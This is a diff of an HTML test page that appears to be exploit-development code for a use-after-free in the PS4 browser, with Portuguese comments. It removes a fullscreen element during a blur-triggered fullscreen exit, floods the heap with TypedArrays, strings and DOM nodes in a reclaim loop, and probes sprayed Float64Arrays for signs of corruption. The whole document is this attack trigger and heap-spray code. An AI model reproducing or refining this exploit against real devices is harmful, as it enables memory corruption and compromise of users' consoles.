@@ -1,163 +1,153 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF Stabilization Test</title>
+<title>PS4 UAF - Aggressive Reclaim (FIEL)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 UAF - Deterministic Reclaim</h2>
-<button onclick="runTest()">Run Test</button>
+<h2>Aggressive Reclaim (Original + Probe)</h2>
+<button onclick="run()">Run</button>
 
-<div id="log" style="margin-top:20px;"></div>
+<div id="log"></div>
 
 <script>
-function log(msg) {
+function log(msg){
     try { console.log(msg); } catch(e){}
     document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
 }
 
-// ==========================
-// HEAP PRESSURE (GC trigger)
-// ==========================
-function pressureGC() {
-    for (let i = 0; i < 50; i++) {
-        let tmp = new Array(100000).fill(i);
+function setupHeap(){
+    let controllers = [];
+    for(let i = 0; i < 5000; i++){
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
     }
+    return controllers;
 }
 
-// ==========================
-// FULLSCREEN SETUP
-// ==========================
-function setupFullscreen() {
+function setupFS(){
     let fsTarget = document.createElement("div");
-
-    fsTarget.innerHTML = "TARGET_OBJECT";
-    fsTarget.style.position = "absolute";
-    fsTarget.style.width = "100%";
-    fsTarget.style.height = "100%";
-    fsTarget.style.background = "black";
-
+    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
+    fsTarget.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
     document.body.appendChild(fsTarget);
-
-    if (fsTarget.webkitRequestFullscreen) {
-        fsTarget.webkitRequestFullscreen();
-    } else {
-        document.documentElement.webkitRequestFullscreen?.();
-    }
-
+    fsTarget.webkitRequestFullscreen();
     return fsTarget;
 }
 
-// ==========================
-// 🔥 DETERMINISTIC RECLAIM
-// ==========================
-function aggressiveReclaim() {
-    log("[*] Reclaim start");
+// 🔴 SEU aggressive reclaim (preservado)
+function aggressiveReclaimLoop(){
 
-    // Fase 1 - churn
-    for (let i = 0; i < 10000; i++) {
-        let el = document.createElement("div");
-        document.body.appendChild(el);
-        el.remove();
-    }
+    let running = true;
 
-    // Fase 2 - spray CONTROLADO (mesmo tipo)
-    for (let i = 0; i < 20000; i++) {
-        let el = document.createElement("div");
+    function loop(){
+        if (!running) return;
 
-        el.innerHTML = "REUSE_EL_" + i;
-        el.style.position = "absolute";
-        el.style.width = "100%";
-        el.style.height = "100%";
+        let tmp = [];
 
-        document.body.appendChild(el);
-    }
+        for(let i = 0; i < 2000; i++){
 
-    log("[*] Reclaim end");
-}
+            // TypedArray
+            let f64 = new Float64Array(10);
+            f64[0] = 13.37;
 
-// ==========================
-// DETECÇÃO REAL
-// ==========================
-function detectCorruption(fsTarget) {
-    log("---- CHECK ----");
+            // Uint32
+            let u32 = new Uint32Array(10);
+            u32[0] = 0x41414141;
 
-    try {
-        let html = fsTarget.innerHTML;
+            // String
+            let str = "REUSE_" + i + "_" + Math.random();
 
-        log("[CHECK] innerHTML = " + html);
+            // DOM
+            let div = document.createElement("div");
+            div.textContent = str;
 
-        if (html && html.includes("REUSE_EL_")) {
-            log("[!!!] POSSÍVEL REUSE DETECTADO");
+            tmp.push(f64);
+            tmp.push(u32);
+            tmp.push(str);
+            tmp.push(div);
         }
 
-    } catch(e) {
-        log("[UAF] innerHTML crash: " + e);
+        // pressão GC (igual padrão)
+        tmp = null;
+
+        setTimeout(loop, 0);
     }
 
-    try {
-        fsTarget.innerHTML = "CORRUPTED_WRITE_TEST";
-        log("[WRITE] sucesso");
-    } catch(e) {
-        log("[UAF WRITE FAIL] " + e);
+    loop();
+
+    return () => { running = false; };
+}
+
+// 🔬 PROBE PASSIVO (não interfere)
+function passiveProbe(victims){
+
+    let anomalies = 0;
+
+    for(let i = 0; i < victims.length; i++){
+        let v = victims[i];
+
+        try {
+            if (v.length !== 8 || v.byteLength !== 64){
+                anomalies++;
+            }
+        } catch(e){
+            anomalies++;
+        }
+    }
+
+    if (anomalies > 0){
+        log("[!] POSSÍVEL CORRUPÇÃO: " + anomalies);
     }
 }
 
-// ==========================
-// TRIGGER REFORÇADO
-// ==========================
-function trigger(fsTarget) {
+function trigger(fsTarget){
     log("[*] Trigger");
 
     try {
         fsTarget.remove();
 
         if (document.webkitIsFullScreen || document.fullscreenElement) {
-            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+            document.webkitExitFullscreen?.();
         }
 
-    } catch(e) {
+    } catch(e){
         log("[ERRO] " + e);
     }
 
-    // 💣 Alinhamento crítico
-    pressureGC();
-
-    // 🔥 Reclaim síncrono pesado
-    for (let i = 0; i < 5; i++) {
-        aggressiveReclaim();
-    }
-
-    // 🔬 Check
-    setTimeout(() => detectCorruption(fsTarget), 100);
+    // 🔴 NÃO MEXER
+    setTimeout(() => location.reload(), 500);
 }
 
-// ==========================
-// LOOP DE TENTATIVA
-// ==========================
-function multiTrigger(fsTarget) {
-    for (let i = 0; i < 10; i++) {
-        setTimeout(() => trigger(fsTarget), i * 200);
-    }
-}
+function run(){
+    log("Running... Press OPTIONS");
 
-// ==========================
-// MAIN
-// ==========================
-function runTest() {
-    const logDiv = document.getElementById("log");
-    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
+    let victims = setupHeap();
+    let fsTarget = setupFS();
 
-    log("[*] Start");
-
-    let fsTarget = setupFullscreen();
-
-    window.onblur = function() {
+    window.onblur = function(){
         log("[*] onblur");
 
-        setTimeout(() => multiTrigger(fsTarget), 2000);
+        setTimeout(() => {
+
+            // 🔴 INICIO da janela crítica (INALTERADO)
+            let stop = aggressiveReclaimLoop();
+
+            // 🔬 probe leve rodando junto
+            let probeInterval = setInterval(() => {
+                passiveProbe(victims);
+            }, 50);
+
+            setTimeout(() => {
+                trigger(fsTarget);
+
+                clearInterval(probeInterval);
+                stop();
+
+            }, 50);
+
+        }, 3000);
     };
 }
 </script>
